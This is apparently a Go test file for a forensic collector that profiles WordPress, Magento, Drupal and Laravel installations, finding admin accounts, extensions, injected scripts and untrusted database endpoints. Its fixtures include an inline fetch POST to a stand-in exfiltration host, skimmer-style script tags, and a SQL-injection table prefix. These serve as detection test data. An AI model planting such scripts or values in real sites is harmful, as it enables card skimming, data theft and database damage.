package apps

import (
	"context"
	"errors"
	"io"
	"io/fs"
	"net"
	"slices"
	"strings"
	"syscall"
	"testing"
	"testing/fstest"

	"github.com/cpibia/tripwatch/internal/collector"
)

func text(s string) *fstest.MapFile { return &fstest.MapFile{Data: []byte(s), Mode: 0o644} }

// fakeDB answers each query with the rows of the first entry whose key it contains.
type fakeDB struct {
	answers map[string][]map[string]string
	queries []string
}

func (f *fakeDB) query(_ context.Context, q string, _ ...any) ([]map[string]string, error) {
	f.queries = append(f.queries, q)
	for k, rows := range f.answers {
		if strings.Contains(q, k) {
			return rows, nil
		}
	}
	return nil, nil
}

func connectTo(db *fakeDB, seen *dbConfig) func(context.Context, collector.Source, dbConfig) (querier, func(), error) {
	return func(_ context.Context, _ collector.Source, cfg dbConfig) (querier, func(), error) {
		*seen = cfg
		return db, func() {}, nil
	}
}

func collect(t *testing.T, fsys fstest.MapFS, c Collector) Result {
	t.Helper()
	out, err := c.Collect(context.Background(), collector.Source{FS: fsys})
	if err != nil {
		t.Fatal(err)
	}
	return out.(Result)
}

const wpConfig = `<?php
// define('DB_PASSWORD', 'sample-not-used');
define( 'DB_NAME', 'blog' );
define( 'DB_USER', 'blog' );
define( 'DB_PASSWORD', 'p4ss\'word' );
define( 'DB_HOST', 'db:3307' );
$table_prefix = 'wpx_';
define( 'WP_DEBUG', true );
`

func TestWordPress(t *testing.T) {
	db := &fakeDB{answers: map[string][]map[string]string{
		"option_name = ?": {{"option_value": `a:2:{s:13:"administrator";a:2:{s:4:"name";s:13:"Administrator";s:12:"capabilities";a:1:{s:14:"manage_options";b:1;}}s:6:"editor";a:2:{s:4:"name";s:6:"Editor";s:12:"capabilities";a:2:{s:10:"edit_posts";b:1;s:14:"manage_options";b:1;}}}`}},
		"usermeta": {{"ID": "1", "user_login": "admin", "user_email": "admin@example.com", "user_registered": "2024-01-01 10:00:00", "caps": `a:1:{s:13:"administrator";b:1;}`},
			{"ID": "5", "user_login": "author", "user_email": "a@example.com", "caps": `a:1:{s:6:"author";b:1;}`},
			{"ID": "7", "user_login": "wp_support", "user_email": "x@example.invalid", "user_registered": "2026-10-20 03:12:00", "caps": `a:1:{s:6:"editor";b:1;}`},
			{"ID": "8", "user_login": "direct", "caps": `a:2:{s:10:"subscriber";b:1;s:15:"install_plugins";b:1;}`}},
		"option_name IN": {{"option_name": "siteurl", "option_value": "https://blog.example.com"},
			{"option_name": "active_plugins", "option_value": `a:2:{i:0;s:19:"akismet/akismet.php";i:1;s:15:"x/wp-cache.php";}`}},
		"LOWER(option_value)": {{"option_name": "widget_custom_html", "option_value": `<script src="https://cdn-stats.example.net/a.js"></script>`}},
		"posts WHERE":         {{"ID": "42", "post_type": "page", "post_content": `<script>fetch("https://exfil.example.org/x",{method:"POST"})</script>`}},
	}}
	var seen dbConfig
	res := collect(t, fstest.MapFS{"var/www/blog/wp-includes/version.php": text("<?php $wp_version = '6.6';"), "var/www/blog/wp-config.php": text(wpConfig)},
		Collector{Connect: connectTo(db, &seen)})

	if len(res.Apps) != 1 {
		t.Fatalf("apps = %+v", res.Apps)
	}
	p := res.Apps[0]
	if seen.Name != "blog" || seen.Password != `p4ss\'word` || seen.Host != "db" || seen.Port != "3307" || seen.Prefix != "wpx_" {
		t.Errorf("config = %+v", seen)
	}
	if p.Database != "blog@db:3307" || strings.Contains(p.Database, "p4ss") {
		t.Errorf("database = %q", p.Database)
	}
	var names []string
	for _, a := range p.Admins {
		names = append(names, a.Name)
	}
	// The editor role was given manage_options; "direct" holds install_plugins itself.
	if !slices.Equal(names, []string{"admin", "wp_support", "direct"}) {
		t.Errorf("admins = %v", names)
	}
	if !slices.Equal(p.Extensions, []string{"akismet/akismet.php", "x/wp-cache.php"}) || p.Settings["siteurl"] != "https://blog.example.com" {
		t.Errorf("extensions %v settings %v", p.Extensions, p.Settings)
	}
	wantInjected := []Injected{
		{Where: "option widget_custom_html", Domains: []string{"cdn-stats.example.net"}},
		{Where: "page 42", Domains: []string{"exfil.example.org"}, Inline: true},
	}
	if len(p.Injected) != 2 || p.Injected[0].Where != wantInjected[0].Where || !slices.Equal(p.Injected[0].Domains, wantInjected[0].Domains) ||
		!p.Injected[1].Inline || !slices.Equal(p.Injected[1].Domains, wantInjected[1].Domains) {
		t.Errorf("injected = %+v", p.Injected)
	}
	if !slices.Contains(p.Warnings, "WP_DEBUG is enabled") {
		t.Errorf("warnings = %v", p.Warnings)
	}
	for _, q := range db.queries {
		if !strings.HasPrefix(strings.TrimSpace(q), "SELECT") || !strings.Contains(q, "wpx_") {
			t.Errorf("query %q", q)
		}
	}
}

const magentoEnv = `<?php
return [
    'backend' => ['frontName' => 'admin_x7k'],
    'db' => [
        'table_prefix' => '',
        'connection' => [
            'default' => [
                'host' => 'localhost',
                'dbname' => 'shop',
                'username' => 'shop',
                'password' => 'secret',
            ]
        ]
    ],
    'MAGE_MODE' => 'developer',
];`

func TestMagento(t *testing.T) {
	db := &fakeDB{answers: map[string][]map[string]string{
		"admin_user": {{"user_id": "1", "username": "admin", "email": "a@example.com", "created": "2023-01-01", "logdate": "2026-10-21", "is_active": "1"}},
		"core_config_data": {{"path": "design/footer/absolute_footer", "scope": "default", "scope_id": "0", "value": `<script src="//checkout-assets.example.net/x.js"></script>`},
			{"path": "web/secure/base_url", "scope": "default", "scope_id": "0", "value": "https://shop.example.com/"}},
		"cms_block": {{"id": "3", "identifier": "footer_links", "content": `<script>var s=document.createElement("script");s.src="https://cdn.example.org/s.js"</script>`}},
	}}
	var seen dbConfig
	res := collect(t, fstest.MapFS{
		"var/www/shop/bin/magento":        text(""),
		"var/www/shop/app/etc/di.xml":     text(""),
		"var/www/shop/app/etc/env.php":    text(magentoEnv),
		"var/www/shop/app/etc/config.php": text("<?php return ['modules' => ['Magento_Store' => 1, 'Vendor_Skimmer' => 1, 'Magento_Off' => 0]];"),
	}, Collector{Connect: connectTo(db, &seen)})

	p := res.Apps[0]
	if seen.Name != "shop" || seen.Host != "localhost" || p.Settings["admin_path"] != "admin_x7k" || p.Settings["mode"] != "developer" {
		t.Errorf("config %+v settings %v", seen, p.Settings)
	}
	if !slices.Equal(p.Extensions, []string{"Magento_Store", "Vendor_Skimmer"}) {
		t.Errorf("modules = %v", p.Extensions)
	}
	if len(p.Admins) != 1 || len(p.Injected) != 2 || p.Injected[0].Domains[0] != "checkout-assets.example.net" || p.Injected[1].Domains[0] != "cdn.example.org" {
		t.Errorf("admins %+v injected %+v", p.Admins, p.Injected)
	}
	if p.Settings["web/secure/base_url@default:0"] != "https://shop.example.com/" {
		t.Errorf("settings = %v", p.Settings)
	}
	if !slices.ContainsFunc(p.Warnings, func(w string) bool { return strings.Contains(w, "developer") }) {
		t.Errorf("warnings = %v", p.Warnings)
	}
}

func TestDrupalAndLaravel(t *testing.T) {
	db := &fakeDB{answers: map[string][]map[string]string{
		"users_field_data": {{"uid": "1", "name": "admin", "mail": "a@example.com", "created": "1700000000", "access": "0", "status": "1"}},
		"core.extension":   {{"data": `a:3:{s:6:"module";a:2:{s:5:"block";i:0;s:4:"node";i:0;}s:5:"theme";a:1:{s:4:"olivero";i:0;}s:7:"profile";s:8:"standard";}`}},
	}}
	var seen dbConfig
	res := collect(t, fstest.MapFS{
		"var/www/site/core/lib/Drupal.php": text("const VERSION = '10.1.0';"),
		"var/www/site/sites/default/settings.php": text(`<?php
$databases['default']['default'] = array (
  'database' => 'drupal', 'username' => 'drupal', 'password' => 'pw', 'prefix' => '', 'host' => 'mariadb', 'port' => '3306', 'driver' => 'mysql',
);`),
		"srv/api/artisan":           text(""),
		"srv/api/bootstrap/app.php": text(""),
		"srv/api/.env":              text("APP_ENV=production\nAPP_DEBUG=true\nAPP_KEY=\nDB_CONNECTION=pgsql\nDB_DATABASE=api\n"),
	}, Collector{Connect: connectTo(db, &seen)})

	byPath := map[string]Profile{}
	for _, p := range res.Apps {
		byPath[p.Path] = p
	}
	d := byPath["/var/www/site"]
	if seen.Name != "drupal" || len(d.Admins) != 1 || d.Admins[0].Created != "2023-11-14T22:13:20Z" || !slices.Equal(d.Extensions, []string{"block", "node"}) {
		t.Errorf("drupal = %+v (config %+v)", d, seen)
	}
	l := byPath["/srv/api"]
	if l.Database != "" || len(l.Warnings) != 2 || !slices.ContainsFunc(l.Issues, func(s string) bool { return strings.Contains(s, "pgsql") }) {
		t.Errorf("laravel = %+v", l)
	}
}

func TestHostilePrefixAndUnreachableDatabase(t *testing.T) {
	fsys := fstest.MapFS{
		"var/www/blog/wp-includes/version.php":  text("<?php"),
		"var/www/blog/wp-config.php":            text("<?php define('DB_NAME','b'); $table_prefix = 'wp_users; DROP TABLE x; --';"),
		"var/www/other/wp-includes/version.php": text("<?php"),
		"var/www/other/wp-config.php":           text("<?php define('DB_NAME','o'); define('DB_HOST','db');"),
	}
	called := 0
	res := collect(t, fsys, Collector{Connect: func(context.Context, collector.Source, dbConfig) (querier, func(), error) {
		called++
		return nil, nil, errors.New("connection refused")
	}})
	if called != 1 {
		t.Errorf("connected %d times, want only for the valid prefix", called)
	}
	for _, p := range res.Apps {
		if len(p.Issues) == 0 || p.Reachable {
			t.Errorf("%s: %+v", p.Path, p)
		}
	}
}

// Containerised applications take their database settings from the environment.
func TestDrupalSettingsFromEnvironment(t *testing.T) {
	var seen dbConfig
	fsys := fstest.MapFS{
		"var/www/site/core/lib/Drupal.php": text("const VERSION = '10.6.0';"),
		"var/www/site/sites/default/settings.php": text(`<?php
$databases['default']['default'] = [
  'database' => getenv('DRUPAL_DB_NAME') ?: 'drupal',
  'username' => getenv('DRUPAL_DB_USER') ?: 'drupal',
  'password' => getenv('DRUPAL_DB_PASSWORD') ?: '',
  'host' => getenv('DRUPAL_DB_HOST') ?: 'localhost',
  'driver' => 'mysql',
];`),
		"var/www/site/sites/default/settings.local.php": text(`<?php $databases['default']['default']['port'] = '3307'; $databases['default']['default'] = ['database' => 'override', 'port' => '3307'];`),
		"proc/1/comm":     text("tini\n"),
		"proc/1/status":   text("Name:\ttini\nPPid:\t0\nUid:\t0\t0\t0\t0\n"),
		"proc/1/environ":  text("PATH=/usr/bin\x00DRUPAL_DB_HOST=mariadb\x00DRUPAL_DB_PASSWORD=pw\x00"),
		"proc/50/comm":    text("php-fpm8.2\n"),
		"proc/50/status":  text("Name:\tphp-fpm8.2\nPPid:\t1\n"),
		"proc/50/environ": text("PATH=/usr/bin\x00"),
		// A PHP process of the web server user trying to feed its own database.
		"proc/7/comm":    text("php\n"),
		"proc/7/status":  text("Name:\tphp\nPPid:\t1\nUid:\t33\t33\t33\t33\n"),
		"proc/7/environ": text("DRUPAL_DB_HOST=evil.example.net\x00DRUPAL_DB_USER=attacker\x00"),
	}
	collect(t, fsys, Collector{Connect: connectTo(&fakeDB{}, &seen)})
	if seen.Host != "mariadb" || seen.Password != "pw" || seen.User != "drupal" || seen.Name != "override" || seen.Port != "3307" {
		t.Errorf("config = %+v", seen)
	}
}

func sockFile(uid uint32) *fstest.MapFile {
	return &fstest.MapFile{Mode: fs.ModeSocket | 0o777, Sys: &syscall.Stat_t{Uid: uid}}
}

func dirFile(uid uint32, perm fs.FileMode) *fstest.MapFile {
	return &fstest.MapFile{Mode: fs.ModeDir | perm, Sys: &syscall.Stat_t{Uid: uid}}
}

func TestEndpoint(t *testing.T) {
	base := func() fstest.MapFS {
		return fstest.MapFS{
			"etc/passwd":   text("root:x:0:0::/root:/bin/sh\nmysql:x:999:999::/nonexistent:/bin/false\nwww-data:x:33:33::/var/www:/bin/sh\n"),
			"proc/88/comm": text("mysqld\n"),
		}
	}
	src := func(fsys fstest.MapFS) collector.Source { return collector.Source{FS: fsys, Root: "/host"} }
	ctx := context.Background()

	good := base()
	good["run/mysqld"] = dirFile(999, 0o755)
	good["run/mysqld/mysqld.sock"] = sockFile(999)
	if net, addr, err := endpoint(ctx, src(good), dbConfig{Host: "localhost"}, nil); err != nil || net != "unix" || addr != "/host/run/mysqld/mysqld.sock" {
		t.Errorf("trusted socket: %s %s %v", net, addr, err)
	}

	for name, fsys := range map[string]fstest.MapFS{
		"socket owned by the web user": func() fstest.MapFS {
			f := base()
			f["run/mysqld"] = dirFile(999, 0o755)
			f["run/mysqld/mysqld.sock"] = sockFile(33)
			return f
		}(),
		"directory owned by the web user": func() fstest.MapFS {
			f := base()
			f["run/mysqld"] = dirFile(33, 0o755)
			f["run/mysqld/mysqld.sock"] = sockFile(999)
			return f
		}(),
		"world-writable directory": func() fstest.MapFS {
			f := base()
			f["run/mysqld"] = dirFile(999, 0o777)
			f["run/mysqld/mysqld.sock"] = sockFile(999)
			return f
		}(),
		"no database process": func() fstest.MapFS {
			f := base()
			delete(f, "proc/88/comm")
			f["run/mysqld"] = dirFile(999, 0o755)
			f["run/mysqld/mysqld.sock"] = sockFile(999)
			return f
		}(),
	} {
		if _, _, err := endpoint(ctx, src(fsys), dbConfig{Host: "localhost"}, nil); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
	if _, _, err := endpoint(ctx, src(good), dbConfig{Host: "localhost", Socket: "/tmp/mysql.sock"}, nil); err == nil {
		t.Error("a socket in /tmp named by the configuration was accepted")
	}

	if _, _, err := endpoint(ctx, src(base()), dbConfig{Host: "evil.example.net"}, nil); !errors.Is(err, errUntrustedHost) {
		t.Errorf("remote host: %v", err)
	}
	if _, _, err := endpoint(ctx, src(base()), dbConfig{Host: "127.0.0.1", Port: "3307"}, nil); !errors.Is(err, errUntrustedHost) {
		t.Errorf("loopback port without a database server: %v", err)
	}
	if _, addr, err := endpoint(ctx, src(base()), dbConfig{Host: "db", Port: "3306"}, []string{"db"}); err != nil || addr != "db:3306" {
		t.Errorf("allowed host: %s %v", addr, err)
	}
	if _, _, err := endpoint(ctx, src(base()), dbConfig{Host: "db", Port: "4444"}, []string{"db"}); err == nil {
		t.Error("an allowed host on another port was accepted")
	}
	if _, _, err := endpoint(ctx, src(base()), dbConfig{Host: "db", Port: "4444"}, []string{"db:4444"}); err != nil {
		t.Errorf("allowed host and port: %v", err)
	}
}

// A server that keeps sending is cut off at the allowance instead of filling memory.
func TestLimitedConn(t *testing.T) {
	client, server := net.Pipe()
	go func() {
		chunk := make([]byte, 1<<20)
		for {
			if _, err := server.Write(chunk); err != nil {
				return
			}
		}
	}()
	c := &limitedConn{Conn: client, left: 3 << 20}
	n, err := io.Copy(io.Discard, c)
	_ = client.Close()
	if !errors.Is(err, errConnLimit) || n != 3<<20 {
		t.Errorf("read %d bytes, err %v", n, err)
	}
}

const tcpHeader = "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n"

// procWithDatabase simulates a mysqld (uid 999) listening on 127.0.0.1:3306 in namespace ns.
func procWithDatabase(ns string) fstest.MapFS {
	return fstest.MapFS{
		"etc/passwd":       text("root:x:0:0::/root:/bin/sh\nmysql:x:999:999::/nonexistent:/bin/false\n"),
		"proc/self/ns/net": &fstest.MapFile{Data: []byte("net:[1]"), Mode: fs.ModeSymlink},
		"proc/88/comm":     text("mysqld\n"),
		"proc/88/status":   text("Name:\tmysqld\nPPid:\t1\nUid:\t999\t999\t999\t999\n"),
		"proc/88/ns/net":   &fstest.MapFile{Data: []byte(ns), Mode: fs.ModeSymlink},
		"proc/88/fd/10":    &fstest.MapFile{Data: []byte("socket:[5000]"), Mode: fs.ModeSymlink},
		"proc/88/net/tcp":  text(tcpHeader + "   0: 0100007F:0CEA 00000000:0000 0A 00000000:00000000 00:00000000 00000000   999        0 5000 1 0 100 0 0 10 0\n"),
		"proc/88/net/tcp6": text(tcpHeader),
	}
}

func TestLoopbackEndpointMatchesExactAddress(t *testing.T) {
	ctx := context.Background()
	src := collector.Source{FS: procWithDatabase("net:[1]"), Root: "/"}

	if _, addr, err := endpoint(ctx, src, dbConfig{Host: "127.0.0.1"}, nil); err != nil || addr != "127.0.0.1:3306" {
		t.Errorf("the real server: %s %v", addr, err)
	}
	// Someone listening on [::1]:3306 while the server is on 127.0.0.1 does not count.
	if _, _, err := endpoint(ctx, src, dbConfig{Host: "::1"}, nil); !errors.Is(err, errUntrustedHost) {
		t.Errorf("[::1] accepted: %v", err)
	}
	if _, _, err := endpoint(ctx, src, dbConfig{Host: "127.0.0.2"}, nil); !errors.Is(err, errUntrustedHost) {
		t.Errorf("another loopback address accepted: %v", err)
	}
	other := collector.Source{FS: procWithDatabase("net:[2]"), Root: "/"}
	if _, _, err := endpoint(ctx, other, dbConfig{Host: "127.0.0.1"}, nil); !errors.Is(err, errUntrustedHost) {
		t.Errorf("a server in another network namespace accepted: %v", err)
	}
}

// A configuration the web user can write gets no access to root's environment.
func TestUntrustedConfigDoesNotReadRootEnvironment(t *testing.T) {
	var seen dbConfig
	fsys := fstest.MapFS{
		"var/www/site/core/lib/Drupal.php": text("const VERSION = '10.6.0';"),
		"var/www/site/sites/default/settings.php": &fstest.MapFile{Mode: 0o644, Sys: &syscall.Stat_t{Uid: 33}, Data: []byte(`<?php
$databases['default']['default'] = ['database' => 'd', 'username' => 'u', 'password' => getenv('ROOT_SECRET') ?: 'none', 'host' => 'localhost', 'driver' => 'mysql'];`)},
		"proc/1/comm":    text("php-fpm\n"),
		"proc/1/status":  text("Name:\tphp-fpm\nPPid:\t0\nUid:\t0\t0\t0\t0\n"),
		"proc/1/environ": text("ROOT_SECRET=s3cret\x00"),
	}
	res := collect(t, fsys, Collector{Connect: connectTo(&fakeDB{}, &seen)})
	if seen.Password != "none" {
		t.Errorf("password = %q, want the literal default", seen.Password)
	}
	if !slices.ContainsFunc(res.Apps[0].Warnings, func(w string) bool { return strings.Contains(w, "environment variables are not used") }) {
		t.Errorf("warnings = %v", res.Apps[0].Warnings)
	}
}

// Drupal 7 includes settings.local.php after settings.php: a local file written by another user
// makes the configuration untrusted even when settings.php belongs to root.
func TestDrupal7LocalSettingsAreChecked(t *testing.T) {
	var seen dbConfig
	fsys := fstest.MapFS{
		"var/www/site/includes/bootstrap.inc": text("define('VERSION', '7.101');"),
		"var/www/site/misc/drupal.js":         text("var Drupal = {};"),
		"var/www/site/sites/default/settings.php": &fstest.MapFile{Mode: 0o644, Sys: &syscall.Stat_t{Uid: 0}, Data: []byte(`<?php
$databases['default']['default'] = array('database' => 'd', 'username' => 'u', 'password' => 'p', 'host' => 'localhost', 'driver' => 'mysql');`)},
		"var/www/site/sites/default/settings.local.php": &fstest.MapFile{Mode: 0o644, Sys: &syscall.Stat_t{Uid: 33}, Data: []byte(`<?php
$databases['default']['default'] = array('database' => 'd', 'username' => 'u', 'password' => getenv('ROOT_SECRET') ?: 'none', 'host' => 'localhost', 'driver' => 'mysql');`)},
		"proc/1/comm":    text("php-fpm\n"),
		"proc/1/status":  text("Name:\tphp-fpm\nPPid:\t0\nUid:\t0\t0\t0\t0\n"),
		"proc/1/environ": text("ROOT_SECRET=s3cret\x00"),
	}
	res := collect(t, fsys, Collector{Connect: connectTo(&fakeDB{}, &seen)})
	if len(res.Apps) != 1 || res.Apps[0].Framework != "drupal7" {
		t.Fatalf("apps = %+v", res.Apps)
	}
	if seen.Password == "s3cret" {
		t.Error("root's environment reached a configuration another user can write")
	}
	if !slices.ContainsFunc(res.Apps[0].Warnings, func(w string) bool { return strings.Contains(w, "settings.local.php") }) {
		t.Errorf("warnings = %v", res.Apps[0].Warnings)
	}
}
